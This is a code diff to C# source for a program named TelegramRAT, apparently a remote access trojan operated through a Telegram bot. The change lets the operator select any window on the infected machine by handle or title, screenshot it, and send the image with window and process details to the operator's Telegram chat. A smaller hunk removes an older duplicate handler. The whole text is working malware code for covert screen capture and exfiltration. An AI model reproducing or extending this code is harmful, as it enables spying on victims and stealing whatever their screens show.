@@ -982,9 +982,28 @@ namespace TelegramRAT
                         try
                         {
                             IntPtr hWnd;
-                            if (model.Args.Length == 1 && (model.Args[0].ToLower() == "info" || model.Args[0].ToLower() == "i"))
+                            if (model.Args[0].ToLower() == "info" || model.Args[0].ToLower() == "i")
                             {
-                                hWnd = WinAPI.GetForegroundWindow();
+                                if (model.Args.Length == 1)
+                                    hWnd = WinAPI.GetForegroundWindow();
+                                else
+                                {
+                                    if (model.Args[1].Contains("0x"))
+                                    {
+                                        string pointerString = string.Join(string.Empty, model.Args[1].Skip(2));
+                                        int pointer = int.Parse(pointerString, System.Globalization.NumberStyles.HexNumber);
+                                        hWnd = new IntPtr(pointer);
+                                    }
+                                    else
+                                    {
+                                        hWnd = WinAPI.FindWindow(null, string.Join(string.Empty, model.Args.Skip(1)));
+                                    }
+                                    if (hWnd == IntPtr.Zero || WinAPI.IsWindow(hWnd) is false)
+                                    {
+                                        Bot.SendTextMessageAsync(model.Message.Chat.Id, "Window not found!", replyToMessageId: model.Message.MessageId);
+                                        return;
+                                    }
+                                }
 
                                 Rectangle windowBounds = WinAPI.GetWindowBounds(hWnd);
                                 string info =
@@ -993,10 +1012,18 @@ namespace TelegramRAT
                                 $"Title: <code>{WinAPI.GetWindowTitle(hWnd)}</code>\n" +
                                 $"Location: {windowBounds.X}x{windowBounds.Y}\n" +
                                 $"Size: {windowBounds.Width}x{windowBounds.Height}\n" +
-                                $"Pointer: <code>0x{hWnd.ToString("X")}</code>\n" +
-                                $"Process Id: <code>{WinAPI.GetProcessId(WinAPI.GetProcessHandleFromWindow(hWnd))}</code>";
+                                $"Pointer: <code>0x{hWnd.ToString("X")}</code>\n\n" +
 
-                                Bot.SendTextMessageAsync(model.Message.Chat.Id, info, ParseMode.Html, replyToMessageId: model.Message.MessageId);
+                                $"Associated Process: <code>{WinAPI.GetProcessId(WinAPI.GetProcessHandleFromWindow(hWnd))}</code>";
+
+                                MemoryStream windowCap = new MemoryStream();
+
+                                Utils.CaptureWindow(hWnd, windowCap);
+
+                                windowCap.Position = 0;
+
+                                Bot.SendPhotoAsync(model.Message.Chat.Id, windowCap, info, replyToMessageId: model.Message.MessageId, parseMode: ParseMode.Html);
+                                
                                 return;
                             }
 
@@ -1019,20 +1046,6 @@ namespace TelegramRAT
                                 }
                                 switch (model.Args[0].ToLower())
                                 {
-                                    case "i":
-                                    case "info":
-                                        Rectangle windowBounds = WinAPI.GetWindowBounds(hWnd);
-                                        string info = "" +
-                                        "Window info\n" +
-                                        "\n" +
-                                        $"Title: <code>{WinAPI.GetWindowTitle(hWnd)}</code>\n" +
-                                        $"Location: {windowBounds.X}x{windowBounds.Y}\n" +
-                                        $"Size: {windowBounds.Width}x{windowBounds.Height}\n" +
-                                        $"Pointer: <code>0x{hWnd.ToString("X")}</code>\n" +
-                                        $"Process Id: <code>{WinAPI.GetProcessId(WinAPI.GetProcessHandleFromWindow(hWnd))}</code>";
-                                        Bot.SendTextMessageAsync(model.Message.Chat.Id, info, ParseMode.Html, replyToMessageId: model.Message.MessageId);
-                                        break;
-
                                     case "min":
                                     case "minimize":
                                         WinAPI.PostMessage(hWnd, WinAPI.WM_SYSCOMMAND, WinAPI.SC_MINIMIZE, 0);
@@ -1801,6 +1814,8 @@ namespace TelegramRAT
                     Bot.SendTextMessageAsync(model.Message.Chat.Id, sysInfo, replyToMessageId: model.Message.MessageId);
                 }
             });
+
+            
 
         }
 
